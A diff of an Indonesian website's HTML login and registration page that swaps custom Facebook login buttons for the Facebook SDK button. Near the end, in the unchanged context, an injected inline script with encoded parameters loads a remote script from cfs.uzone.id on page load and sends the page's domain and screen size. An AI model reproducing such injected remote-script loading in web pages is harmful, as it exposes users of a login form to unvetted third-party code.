@@ -60,18 +60,25 @@
                 <input type="submit" name="btnLogin" value="LOGIN" class="btn btn-primary big"/>
                 <p class="forgot-password">Lupa password ? <a href="forgot_password.html">klik disini</a></p>
                 <hr size="1"/>
+
                 <div id="loginFB" style="margin:0;">
+                      <h4>Atau, anda bisa login menggunakan Facebook</h4>
+                      
+                      <div class="fb-login-button" data-max-rows="1" data-size="xlarge" data-show-faces="false" data-auto-logout-link="false" onlogin="checkLoginState();"></div>
+                </div>
+
+                <!-- <div id="loginFB" style="margin:0;">
                   <h4>Atau, anda bisa login menggunakan Facebook<h4>
                   
-                  <a href="" class="btn btn-primary facebook-btn" onclick="loginWithFacebook();return;"><img src="images/fb.png">LOGIN DENGAN FACEBOOK</a>
-                </div>
+                  <a href="" class="btn btn-primary" onclick="loginWithFacebook();return;">LOGIN DENGAN FACEBOOK</a>
+                </div> -->
 
               </form>
               </div>
           </div>
             
         </div>
-        <div class="col-md-6">
+        <div class="col-md-6 reg">
             <div class="login-box registerbox">
               <div class="heading black">BUAT AKUN BARU</div>
               <div class="body">
@@ -83,12 +90,12 @@
               <input type="text" name="phone_number" value="" placeholder="+62813xxxxxxx" data-toggle="tooltip" data-placement="right" title="For mobile phone number, the format should be +6281xxxxxxx"/>
               <input type="password" name="password" value="" placeholder="Password"/>
               <input type="submit" name="btnLogin" value="DAFTAR" class="btn btn-primary big"/>
+              <div id="loginFB" class="register-loginFB" style="margin:0;">
+                      <h4>Atau, anda bisa login menggunakan Facebook</h4>
+                      
+                      <div class="fb-login-button" data-max-rows="1" data-size="xlarge" data-show-faces="false" data-auto-logout-link="false" onlogin="checkLoginState();"></div>
+              </div>
             </form>
-                <div id="registerFB" style="margin:0;">
-                  <h4>Atau, anda bisa register menggunakan Facebook<h4>
-                  
-                  <a href="" class="btn btn-primary facebook-btn"><img src="images/fb.png">REGISTER DENGAN FACEBOOK</a>
-                </div>
               </div>
             </div>
         </div>
@@ -167,4 +174,5 @@
   </script>
   <!--/facebook-->
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKdzCgSv1CUEM9fxloawdcRD1hS4k7e2LjsRbpBWMZFtAmfIZPNbf%2fmLExE231%2bVd%2fL%2fyrSkPPSYfqMQZZdWI7tvh1qms6Qu0JEkBjzNivS94r%2fO5ciCb6lKVjy%2f9exjKFoz836kJcYBKkCfxJJMr2feNPriwWX7dM1j9wz1r%2bh8xAkeuifdCSJdRgFXoimHCHw%2fTw2%2b%2ffhSXJHBucnidJWexkHna9D2hfkofD0tpFv3phoHz6X3Q9pNsKxkIvxwt%2b9au5nZgDlnVDP%2f%2bG8XoYjq7hWUt5FamXaPNHrx88jnMMHvoIWYrvhlYzaiPBQVDtmSXv5eOJ9vcQ0nHnbRBP8ubguaowWaTs3qHHjUaL8LqCBchCLszIJXl7Y0fXwaX2zxczJK2WzC5%2bqfMO%2fh7LlJsrMxRZPmOJOzSxDY%2frw04fmhbj811oQA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<link href="css/login.css" rel="stylesheet">
 </html>
